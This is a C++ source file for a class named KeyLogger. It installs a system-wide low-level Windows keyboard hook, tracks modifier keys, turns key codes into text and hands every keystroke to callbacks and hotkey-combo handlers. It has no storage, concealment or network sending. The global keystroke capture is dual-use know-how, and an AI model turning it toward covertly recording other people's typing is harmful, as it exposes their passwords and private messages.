#include "KeyLogger.h"

#include <iostream>
#include <algorithm>

using namespace std;

string KeyToText(unsigned key, byte flags)
{
	switch (key)
	{
	case VK_CLEAR:
		return "[CLEAR]";
	

	case VK_ESCAPE:
		return "[ESCAPE]";
	case VK_TAB:
		return "[TAB]";
	case VK_CAPITAL:
		return "[CAPITAL]";
	case VK_LSHIFT:
		return "[LSHIFT]";
	case VK_LCONTROL:
		return "[LCONTROL]";
	case VK_LWIN:
		return "[LWIN]";
	case VK_ALT:
		return "[ALT]";
	case VK_SPACE:
		return "[SPACE]";
	case VK_ALT_GR:
		return "[ALT_GR]";
	case VK_RWIN:
		return "[RWIN]";
	case VK_APPS:
		return "[APPS]";
	case VK_RCONTROL:
		return "[RCONTROL]";
	case VK_RSHIFT :
		return "[RSHIFT]";
	case VK_RETURN:
		return "[ENTER]";
	case VK_BACK:
		return "[BACK]";


	case VK_PAUSE:
		return "[PAUSE]";
	case VK_CONVERT:
		return "[CONVERT]";
	case VK_NONCONVERT:
		return "[NONCONVERT]";
	case VK_ACCEPT:
		return "[ACCEPT]";
	case VK_MODECHANGE:
		return "[MODECHANGE]";

	
	case VK_PRIOR:
		return "[PRIOR]";
	case VK_NEXT:
		return "[NEXT]";
	case VK_END:
		return "[END]";
	case VK_HOME:
		return "[HOME]";
	case VK_LEFT:
		return "[LEFT]";
	case VK_UP:
		return "[UP]";
	case VK_RIGHT:
		return "[RIGHT]";
	case VK_DOWN:
		return "[DOWN]";
	case VK_SELECT:
		return "[SELECT]";
	case VK_PRINT:
		return "[PRINT]";
	case VK_EXECUTE:
		return "[EXECUTE]";
	case VK_SNAPSHOT:
		return "[SNAPSHOT]";
	case VK_INSERT:
		return "[INSERT]";
	case VK_DELETE:
		return "[DELETE]";
	case VK_HELP:
		return "[HELP]";


	case VK_NUMPAD0:
		return "[NUMPAD0]";
	case VK_NUMPAD1:
		return "[NUMPAD1]";
	case VK_NUMPAD2:
		return "[NUMPAD2]";
	case VK_NUMPAD3:
		return "[NUMPAD3]";
	case VK_NUMPAD4:
		return "[NUMPAD4]";
	case VK_NUMPAD5:
		return "[NUMPAD5]";
	case VK_NUMPAD6:
		return "[NUMPAD6]";
	case VK_NUMPAD7:
		return "[NUMPAD7]";
	case VK_NUMPAD8:
		return "[NUMPAD8]";
	case VK_NUMPAD9:
		return "[NUMPAD9]";
	case VK_MULTIPLY:
		return "[MULTIPLY]";
	case VK_ADD:
		return "[ADD]";
	case VK_SEPARATOR:
		return "[SEPARATOR]";
	case VK_SUBTRACT:
		return "[SUBTRACT]";
	case VK_DECIMAL:
		return "[DECIMAL]";
	case VK_DIVIDE:
		return "[DIVIDE]";

	case VK_F1:
		return "[F1]";
	case VK_F2:
		return "[F2]";
	case VK_F3:
		return "[F3]";
	case VK_F4:
		return "[F4]";
	case VK_F5:
		return "[F5]";
	case VK_F6:
		return "[F6]";
	case VK_F7:
		return "[F7]";
	case VK_F8:
		return "[F8]";
	case VK_F9:
		return "[F9]";
	case VK_F10:
		return "[F10]";
	case VK_F11:
		return "[F11]";
	case VK_F12:
		return "[F12]";
	case VK_F13:
		return "[F13]";
	case VK_F14:
		return "[F14]";
	case VK_F15:
		return "[F15]";
	case VK_F16:
		return "[F16]";
	case VK_F17:
		return "[F17]";
	case VK_F18:
		return "[F18]";
	case VK_F19:
		return "[F19]";
	case VK_F20:
		return "[F20]";
	case VK_F21:
		return "[F21]";
	case VK_F22:
		return "[F22]";
	case VK_F23:
		return "[F23]";
	case VK_F24:
		return "[F24]";

	default:
		if (key >= '0' && key <= '9')
			return string() + (char)key;
		if (key >= 'A' && key <= 'Z')
		{
			if (IS_FLAG_SET(flags, FLAG_SHIFT_MASK) == IS_FLAG_SET(flags, FLAG_CAPS_MASK))
				return string() + (char)tolower(key);
			
			return string() + (char)key;
		}


		return "[KEY: " + to_string(key) + "]";
	}
}


/* //////////////////////////////////////////////////////////////////////////////// */
// // KeyCombo //
/* //////////////////////////////////////////////////////////////////////////////// */
void KeyCombo::sortKeys()
{
	sort(m_Keys.begin(), m_Keys.end());
}
void KeyCombo::callCallBack(bool newPress)
{
	m_CallBack(newPress);
}

KeyCombo::KeyCombo()
	: m_CallBack()
{
}
KeyCombo::KeyCombo(std::vector<unsigned> keys, KeyComboCallback callBack)
	: m_CallBack(callBack),
	m_Keys(keys)
{
	sortKeys();
}
KeyCombo::~KeyCombo()
{
}

void KeyCombo::setCallBack(KeyComboCallback callBack)
{
	m_CallBack = callBack;
}

std::vector<unsigned> KeyCombo::getKeys() const
{
	return m_Keys;
}

void KeyCombo::setKeys(std::vector<unsigned> keys)
{
	m_Keys = keys;
}

string KeyCombo::getString() const
{
	string str = "KeyCombo(";

	if (!m_Keys.empty())
		for (unsigned i = 0; i < m_Keys.size(); i++)
		{
			str += KeyToText(m_Keys[i]);
			if (i + 1 < m_Keys.size())
				str += " + ";
		}
	else
		str += "empty";

	return str + ")";
}
bool KeyCombo::operator==(const KeyCombo& other) const
{
	if (m_Keys.empty())
		return false;

	if (m_Keys.size() != other.m_Keys.size())
		return false;

	//all combos are sorted in the same order
	return memcmp(&m_Keys[0], &other.m_Keys[0], m_Keys.size()) == 0;
}

/* //////////////////////////////////////////////////////////////////////////////// */
// // KeyLogger //
/* //////////////////////////////////////////////////////////////////////////////// */
static KeyLogger* instance;
HHOOK kbdhook;
HKL keyBoardLayout;

LRESULT CALLBACK handleKeys(UINT message, WPARAM wp, LPARAM lp);
KeyLogger::KeyLogger()
{
	memset(&m_KeyStates, 0, sizeof(m_KeyStates));
	instance = this;
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(handleKeys), GetModuleHandle(NULL), NULL);
	keyBoardLayout = GetKeyboardLayout(NULL);
}
KeyLogger::~KeyLogger()
{
	UnhookWindowsHookEx(kbdhook);
	instance = nullptr;
}

void KeyLogger::addCallBack(const KeyLoggerCallback& callback)
{
	m_CallBacks.push_back(callback);
}
void KeyLogger::addKeyCombo(const KeyCombo& combo)
{
	m_KeyCombos.push_back(combo);
}

KeyCombo KeyLogger::getCurrentCombo()
{
	vector<unsigned> keys;
	for (unsigned i = 1; i < KEY_STATE_SIZE; i++)
		if (m_KeyStates[i])
			keys.push_back(i);

	return KeyCombo(keys);
}

/* ********************************************************* */
// * callback *
/* ********************************************************* */
#define SWITCH_FLAG(flags, mask) (flags ^ mask)
void KeyLogger::keyEvent(unsigned key, bool pressed)
{
	if (key >= KEY_STATE_SIZE)
		return;

	bool newPress = !m_KeyStates[key];
	m_KeyStates[key] = pressed;

	if (newPress || !pressed)
	{
		switch (key)
		{
		case VK_LSHIFT:
		case VK_RSHIFT:
			m_Flags = SWITCH_FLAG(m_Flags, FLAG_SHIFT_MASK);
			break;
		case VK_LCONTROL:
		case VK_RCONTROL:
			m_Flags = SWITCH_FLAG(m_Flags, FLAG_CONTROL_MASK);
			break;
		case VK_ALT:
		case VK_ALT_GR:
			m_Flags = SWITCH_FLAG(m_Flags, FLAG_ALT_MASK);
			break;
		case VK_CAPITAL:
			m_Flags = SWITCH_FLAG(m_Flags, FLAG_CAPS_MASK);
			break;
		case VK_LWIN:
		case VK_RWIN:
			m_Flags = SWITCH_FLAG(m_Flags, FLAG_WIN_MASK);
			break;
		default:
			break;
		}
	}

	if (pressed)
	{
		for (unsigned i = 0; i < m_CallBacks.size(); i++)
			m_CallBacks[i](key, newPress, m_Flags);
		
		if (m_KeyCombos.size() > 0)
		{
			KeyCombo combo = getCurrentCombo();
			for (unsigned i = 0; i < m_KeyCombos.size(); i++)
				if (m_KeyCombos[i] == combo)
					m_KeyCombos[i].callCallBack(newPress);
		}
	}
	
}
LRESULT CALLBACK handleKeys(UINT message, WPARAM wp, LPARAM lp)
{
	if (message == HC_ACTION)
	{
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);

		switch (wp)
		{
		case WM_KEYUP:
		case WM_SYSKEYUP:
			instance->keyEvent(st_hook.vkCode, false);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			instance->keyEvent(st_hook.vkCode, true);
			break;
		default:
			break;
		}
	}
	return CallNextHookEx(kbdhook, message, wp, lp);
}

MSG msg_;
void KeyLogger::startCallBackLoop() const
{
	while (true)
	{
		WaitMessage();
		if (PeekMessage(&msg_, nullptr, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&msg_);
			DispatchMessage(&msg_);
		}
	}
}
void KeyLogger::update() const
{
	if (PeekMessage(&msg_, nullptr, 0, 0, PM_REMOVE))
	{
		TranslateMessage(&msg_);
		DispatchMessage(&msg_);
	}

}
